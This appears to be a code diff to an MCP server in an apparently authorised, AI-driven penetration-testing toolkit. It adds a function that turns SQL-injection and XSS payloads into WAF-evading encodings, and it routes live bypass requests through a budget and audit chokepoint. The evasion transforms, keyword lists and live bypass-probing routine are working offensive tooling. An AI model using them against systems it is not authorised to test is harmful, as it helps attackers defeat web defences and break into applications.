@@ -17,13 +17,15 @@ waf-bypass-mcp is listed in its TIER2_MCP_SERVERS set).
 """
 
 import os
+import re
 import subprocess
 import sys
 import time
 from urllib.parse import urlsplit, urlunsplit
 
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
-from budget_guard import enforce as _enforce_budget  # noqa: E402
+from budget_guard import BudgetExceeded  # noqa: E402
+from tool_resolver import run_tool  # noqa: E402
 
 from mcp.server.fastmcp import FastMCP
 
@@ -34,14 +36,32 @@ REALISTIC_UA = (
     "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
 )
 
+# Keywords/markers used by mutate_payload() to auto-detect context and to
+# target the case-mixing / comment-splitting mutations. Mirrors
+# .claude/skills/waf-evasion-encoding-playbook/SKILL.md.
+_SQL_KEYWORDS = [
+    "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "WHERE",
+    "FROM", "AND", "OR", "EXEC", "EXECUTE", "ORDER BY", "GROUP BY",
+]
+_XSS_MARKERS = [
+    "<script", "</script>", "onerror", "onload", "onclick", "javascript:",
+    "<img", "<svg", "alert(",
+]
+
 
 def _curl_status(url: str, extra_args: list[str], timeout: int = 15) -> tuple[int | None, str | None]:
+    # Routed through tool_resolver.run_tool() rather than a bare
+    # subprocess.run() -- attempt_bypass() can send ~30-40 real requests at
+    # the live target in one call (one per Tier 1-4 variant), and run_tool()
+    # is the single chokepoint that enforces the per-engagement budget and
+    # writes the audit log for every one of them, same as every other Tier-2
+    # MCP server.
     args = [
-        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
+        "-s", "-o", "/dev/null", "-w", "%{http_code}",
         "--max-time", str(timeout), "-A", REALISTIC_UA, *extra_args, url,
     ]
     try:
-        result = subprocess.run(args, capture_output=True, text=True, timeout=timeout + 5)
+        result = run_tool("curl", args, retry_on_rate_limit=False, timeout=timeout + 5)
     except subprocess.TimeoutExpired:
         return None, "timeout"
     except FileNotFoundError:
@@ -50,6 +70,129 @@ def _curl_status(url: str, extra_args: list[str], timeout: int = 15) -> tuple[in
     if out.isdigit():
         return int(out), None
     return None, (result.stderr.strip() or f"curl exit {result.returncode}")
+
+
+# ---------------------------------------------------------------------------
+# Payload-content mutation (mutate_payload()) -- distinct from the tiers
+# above. Tiers 1-4 handle a WHOLE request getting blocked regardless of
+# payload; these handle a payload getting blocked/stripped because a WAF's
+# signature matched its literal content, even though the request itself
+# reaches the backend. Every transform here is a deterministic string
+# rewrite (percent/HTML/case/whitespace), not a live request or a model
+# call -- see .claude/skills/waf-evasion-encoding-playbook/SKILL.md for the
+# manual technique list this operationalizes.
+# ---------------------------------------------------------------------------
+
+def _percent_encode_all(s: str) -> str:
+    return "".join(f"%{b:02X}" for b in s.encode("utf-8"))
+
+
+def _double_percent_encode(s: str) -> str:
+    return _percent_encode_all(s).replace("%", "%25")
+
+
+def _html_entity_encode(s: str, hex_form: bool) -> str:
+    if hex_form:
+        return "".join(f"&#x{ord(c):x};" for c in s)
+    return "".join(f"&#{ord(c)};" for c in s)
+
+
+def _overlong_utf8(s: str) -> str:
+    # Only characters with a well-documented overlong 2-byte UTF-8 encoding
+    # that real WAF bypasses have relied on (Apache/Tomcat path-traversal
+    # class) -- deliberately not generalized to arbitrary characters, since
+    # getting the byte math wrong here would produce garbage instead of a
+    # valid (if non-canonical) encoding.
+    overlong = {"/": "%c0%af", ".": "%c0%ae", "<": "%c0%bc", ">": "%c0%be"}
+    out = s
+    for ch, enc in overlong.items():
+        out = out.replace(ch, enc)
+    return out
+
+
+def _whitespace_variants(s: str) -> dict[str, str]:
+    if " " not in s:
+        return {}
+    subs = {
+        "whitespace -> %09 (tab)": "%09",
+        "whitespace -> %0A (newline)": "%0A",
+        "whitespace -> %0B (vertical tab)": "%0B",
+        "whitespace -> %0C (form feed)": "%0C",
+        "whitespace -> %A0 (NBSP)": "%A0",
+        "whitespace -> /**/ (SQL comment)": "/**/",
+    }
+    return {name: s.replace(" ", sub) for name, sub in subs.items()}
+
+
+def _mixed_case_keywords(s: str) -> str:
+    def mix(word: str) -> str:
+        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(word))
+
+    out = s
+    for kw in _SQL_KEYWORDS:
+        # \b word boundaries -- without them "OR" matches inside "FORMULA"
+        # and "AND" inside "SANDBOX", corrupting unrelated text instead of
+        # only mutating the actual keyword.
+        out = re.sub(rf"\b{re.escape(kw)}\b", lambda m: mix(m.group(0)), out, flags=re.IGNORECASE)
+    return out
+
+
+def _sql_comment_split(s: str) -> str:
+    def splitter(m: re.Match) -> str:
+        w = m.group(0)
+        mid = max(1, len(w) // 2)
+        return w[:mid] + "/**/" + w[mid:]
+
+    out = s
+    for kw in _SQL_KEYWORDS:
+        out = re.sub(rf"\b{re.escape(kw)}\b", splitter, out, flags=re.IGNORECASE)
+    return out
+
+
+def _js_hex_escape(s: str) -> str:
+    out = []
+    for c in s:
+        cp = ord(c)
+        if cp < 256:
+            out.append(f"\\x{cp:02x}")
+        elif cp <= 0xFFFF:
+            out.append(f"\\u{cp:04x}")
+        else:
+            # \uXXXX is only valid for the BMP (exactly 4 hex digits) -- a
+            # codepoint above 0xFFFF (e.g. an emoji) needs JS's \u{...}
+            # codepoint escape form instead, or \uXXXX just emits invalid
+            # syntax with 5+ digits.
+            out.append(f"\\u{{{cp:x}}}")
+    return "".join(out)
+
+
+def _has_xss_marker(payload: str) -> bool:
+    lower = payload.lower()
+    for marker in _XSS_MARKERS:
+        m = marker.lower()
+        # A word boundary only makes sense on a side where the marker
+        # itself starts/ends with a word character -- markers anchored by
+        # punctuation ("<script", "alert(", "javascript:") are already
+        # distinctive without one. Plain-word markers like "onload"/
+        # "onclick" need it, or they match as a substring of an unrelated
+        # word ("onload" inside "salonload", "onclick" inside "econclick").
+        prefix = r"\b" if m[0].isalnum() else ""
+        suffix = r"\b" if m[-1].isalnum() else ""
+        if re.search(prefix + re.escape(m) + suffix, lower):
+            return True
+    return False
+
+
+def _detect_context(payload: str) -> str:
+    has_sql = any(re.search(rf"\b{re.escape(kw)}\b", payload, re.IGNORECASE) for kw in _SQL_KEYWORDS)
+    has_xss = _has_xss_marker(payload)
+    if has_sql and has_xss:
+        return "both"
+    if has_sql:
+        return "sql"
+    if has_xss:
+        return "xss"
+    return "generic"
 
 
 def _tier1_variants(url: str) -> list[tuple[str, list[str], str]]:
@@ -164,11 +307,6 @@ def attempt_bypass(url: str, baseline_status: int = 403, tiers: str = "1,2,3,4",
     here -- see the master prompt's Phase 0.6 for that step. `delay`
     (seconds between requests, default 0.5) keeps this from hammering an
     already-suspicious endpoint with a rapid burst."""
-    try:
-        _enforce_budget("curl-waf-bypass")
-    except Exception as e:
-        return f"Error: {e}"
-
     requested_tiers = [t.strip() for t in tiers.split(",") if t.strip()]
     variants: list[tuple[str, str, list[str], str]] = []
     for t in requested_tiers:
@@ -181,8 +319,14 @@ def attempt_bypass(url: str, baseline_status: int = 403, tiers: str = "1,2,3,4",
 
     results = []
     successes = []
+    budget_exhausted = False
     for tier, label, extra_args, variant_url in variants:
-        status, err = _curl_status(variant_url, extra_args)
+        try:
+            status, err = _curl_status(variant_url, extra_args)
+        except BudgetExceeded as e:
+            results.append(f"  [tier {tier}] {label}: SKIPPED (budget exhausted: {e})")
+            budget_exhausted = True
+            break
         time.sleep(delay)
         if err:
             results.append(f"  [tier {tier}] {label}: ERROR ({err})")
@@ -193,7 +337,8 @@ def attempt_bypass(url: str, baseline_status: int = 403, tiers: str = "1,2,3,4",
             successes.append((tier, label, status, variant_url))
         results.append(f"  [tier {tier}] {label}: HTTP {status}{marker}")
 
-    header = f"Tried {len(variants)} bypass variant(s) against {url} (baseline {baseline_status}):"
+    tried = len(results) if budget_exhausted else len(variants)
+    header = f"Tried {tried} of {len(variants)} bypass variant(s) against {url} (baseline {baseline_status}):"
     if successes:
         footer = "\n\nPossible bypasses found:\n" + "\n".join(
             f"  tier {t} / {label} -> HTTP {status} ({vurl})" for t, label, status, vurl in successes
@@ -208,6 +353,71 @@ def attempt_bypass(url: str, baseline_status: int = 403, tiers: str = "1,2,3,4",
         )
 
     return header + "\n" + "\n".join(results) + footer
+
+
+@app.tool()
+def mutate_payload(payload: str, context: str = "auto") -> str:
+    """Generate WAF/filter-evasion encodings of an injection payload using
+    the deterministic techniques from
+    .claude/skills/waf-evasion-encoding-playbook/SKILL.md -- for when a
+    payload is logically correct but a WAF strips or blocks it based on
+    its literal content. Distinct from attempt_bypass(): that handles the
+    whole REQUEST being blocked regardless of payload; this handles the
+    PAYLOAD itself being pattern-matched once the request already reaches
+    the backend.
+
+    Pure string transformation -- no live request is sent, so this isn't
+    scope-gated or budget-counted. Feed the variant that looks most
+    promising into sqlmap/dalfox/ffuf/curl yourself and diff the response
+    against the baseline blocked one (status + body hash) -- a
+    byte-identical block page means that variant didn't change anything.
+
+    `context`: "sql" (keyword case-mixing/comment-splitting), "xss" (JS
+    hex-escapes), or "auto" (detect from payload content -- runs both
+    sets if it looks like both). Generic encodings (percent, double
+    percent, HTML entity, overlong UTF-8, whitespace substitution) always
+    run regardless of context."""
+    if not payload:
+        return "Error: payload is empty."
+
+    ctx = context.lower().strip()
+    if ctx == "auto":
+        ctx = _detect_context(payload)
+    elif ctx not in ("sql", "xss", "both", "generic"):
+        return f"Error: unknown context {context!r}, expected one of: auto, sql, xss, both, generic."
+
+    variants: dict[str, str] = {
+        "percent-encode all": _percent_encode_all(payload),
+        "double percent-encode": _double_percent_encode(payload),
+        "HTML entity (hex)": _html_entity_encode(payload, hex_form=True),
+        "HTML entity (decimal)": _html_entity_encode(payload, hex_form=False),
+        "overlong UTF-8 (/ . < >)": _overlong_utf8(payload),
+    }
+    variants.update(_whitespace_variants(payload))
+
+    if ctx in ("sql", "both"):
+        variants["SQL mixed-case keywords"] = _mixed_case_keywords(payload)
+        variants["SQL inline-comment split"] = _sql_comment_split(payload)
+    if ctx in ("xss", "both"):
+        variants["JS hex-escape"] = _js_hex_escape(payload)
+
+    lines = [f"Encoded variants of {payload!r} (context: {ctx}):", ""]
+    shown = 0
+    for name, mutated in variants.items():
+        if mutated == payload:
+            continue
+        shown += 1
+        lines.append(f"  [{name}]")
+        lines.append(f"    {mutated}")
+    if shown == 0:
+        lines.append("  (no transform changed the payload -- nothing to encode/mutate in it)")
+    lines.append("")
+    lines.append(
+        "Send the promising ones yourself via sqlmap/dalfox/ffuf/curl and "
+        "diff against the baseline blocked response -- a byte-identical "
+        "block page means that variant didn't change anything."
+    )
+    return "\n".join(lines)
 
 
 if __name__ == "__main__":
